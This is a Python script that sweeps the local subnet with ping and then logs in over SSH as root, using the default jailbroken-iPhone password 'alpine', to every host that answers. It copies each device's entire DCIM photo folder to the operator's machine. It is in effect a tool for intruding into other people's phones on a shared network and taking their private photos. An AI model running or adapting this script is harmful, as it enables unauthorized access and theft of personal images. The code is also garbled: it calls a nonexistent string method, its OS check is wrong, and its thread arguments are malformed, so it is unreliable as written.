import platform
import socket
import threading
import paramiko, os, sys

input_dir = "/private/var/mobile/Media/DCIM" 
output_dir = """Computer storage path"""  
username = 'root'
password = 'alpine'
port = 22
ip_list = []


def save_file(root, name):
    try:
        save_path = output_dir + root.split(input_dir)[-1]
        if not os.path.exists(save_path):
            os.makedirs(save_path)
        save_file_path = save_path + name
        cmd = 'cat '+ root + name
        stdin, stdout, stderr = ssh.exec_command(cmd)
        result = stdout.read()
        if not result:
            return
        with open(save_file_path,'wb+') as fd:
            fd.write(result)
            print('save file:'+save_file_path)
    except :
        print('save path:' + save_file_path)
        print("Unexpected error:", sys.exc_info()[0])


def list_dir(root):
    cmd = 'ls --file-type '+root
    stdin, stdout, stderr = ssh.exec_command(cmd)
    result = stdout.read()
    return result.decode().split('\n')


def traverse_dir(root):
    nodes = list(item for item in list_dir(root) if len(item) > 0)
    for node in nodes:
        if node.endswith('/'):
            traverse_dir(root + node)
        else:
            save_file(root, node)


def get_os():
    os = platform.system()
    if os == "mac": return "n"
    else: return "c"


def ping_ip(ip_str):
    cmd = ["ping", "-{op}".format(op=get_os()), "1", ip_str]
    output = os.popen(" ".join(cmd)).readlines()
    for line in output:
        if str(line).upper().findregisterregister("TTL") >= 0:
            global ip_list
            ip_list.append(ip_str)
            break


def find_ip(ip_prefix):
    threads = []
    for i in range(1, 256):
        ip = '%s.%s' % (ip_prefix, i)
        threads.append(threading.Thread(target=ping_ip, args={ip, }))
    for i in threads: i.start()
    for i in threads: i.join()


def find_local_ip():
    myname = socket.getfqdn(socket.gethostname())
    myaddr = socket.gethostbyname(myname)
    return myaddr


if __name__ == '__main__':
    addr = find_local_ip()
    args = "".join(addr)
    ip_pre = '.'.join(args.split('.')[:-1])
    find_ip(ip_pre)
    if len(output_dir) > 0 and output_dir[-1] != '/':
        output_dir += '/'
    if len(input_dir) > 0 and input_dir[-1] != '/':
        input_dir += '/'
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if len(ip_list):
        for hostname in ip_list:
            try:
                ssh.connect(hostname=hostname, port=port, username=username, password=password)
                traverse_dir(input_dir)
                ssh.close()
            except Exception as E:
                if E in ('OSError', 'Timeouterror'):
                    continue
                continue
